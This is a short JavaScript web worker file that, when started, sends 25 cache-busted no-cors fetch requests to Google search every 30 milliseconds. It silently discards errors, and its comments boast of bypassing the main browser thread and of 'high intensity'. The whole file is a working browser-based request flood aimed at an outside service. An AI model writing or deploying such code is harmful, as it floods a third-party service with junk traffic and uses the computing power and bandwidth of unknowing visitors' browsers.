// scripts/worker.js
self.onmessage = function(e) {
    if (e.data === "start") {
        setInterval(() => {
            // We fire the burst inside the worker
            for (let b = 0; b < 25; b++) {
                const salt = Math.random().toString(36).substring(2, 10);
                const testUrl = `https://www.google.com/search?q=tiktok&v=${salt}`;

                // Fetching inside a worker bypasses the Main Browser Thread
                fetch(testUrl, { 
                    mode: 'no-cors', 
                    cache: 'no-store' 
                }).catch(() => {});
            }
        }, 30); // 30ms pulse for high intensity
    }
};
